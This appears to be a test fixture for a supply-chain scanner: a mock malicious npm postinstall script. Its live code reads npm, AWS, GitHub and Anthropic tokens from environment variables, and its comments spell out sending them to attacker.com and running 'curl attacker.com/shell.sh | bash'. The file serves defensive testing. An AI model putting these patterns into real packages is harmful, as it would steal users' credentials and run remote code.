// FORGEGUARDIAN TEST FIXTURE — simulated malicious postinstall script
// This file is INTENTIONALLY VULNERABLE for scanner testing.
// DO NOT run this in production. It is inert (network calls are commented out)
// but contains patterns that ForgeGuardian's behavioral + semgrep scanners should flag.

const os = require('os');
const cp = require('child_process');

// Pattern 1: Environment variable harvesting (obfuscated)
// Behavioral scanner should flag: accessing process.env in postinstall
const _e = process['e' + 'nv'];
const secrets = {
  npm_token: _e['NPM_TOKEN'],
  aws_key: _e['AWS_ACCESS_KEY_ID'],
  aws_secret: _e['AWS_SECRET_ACCESS_KEY'],
  gh_token: _e['GITHUB_TOKEN'],
  anthropic: _e['ANTHROPIC_API_KEY'],
};

// Pattern 2: Outbound HTTP exfiltration (inert — URL removed)
// Behavioral scanner flags: http.request in postinstall + process.env access
// REAL ATTACK would be: require('https').request({ host: 'attacker.com', path: '/?d=' + JSON.stringify(secrets) })
const EXFIL_HOST = 'INERT_FOR_TESTING_DO_NOT_RUN'; // attacker C2 would go here

// Pattern 3: child_process spawn in postinstall
// Semgrep rule: child_process-exec-in-lifecycle-script
function tryPersist() {
  try {
    // REAL ATTACK: cp.exec('curl attacker.com/shell.sh | bash')
    const safe_cmd = 'echo "forgeguardian-test-pattern-only"';
    cp.exec(safe_cmd, () => {});
  } catch (_) {}
}

// Pattern 4: __dirname traversal (attempting to read parent package files)
const path = require('path');
const targetPath = path.join(__dirname, '..', '..', '..', 'package.json');

// Pattern 5: Base64 encoded payload (obfuscation indicator)
// Behavioral scanner flags: Buffer.from + base64 decode in lifecycle script
const _p = Buffer.from('ZWNobyAiZm9yZ2VndWFyZGlhbi10ZXN0Ig==', 'base64').toString();

module.exports = { tryPersist };
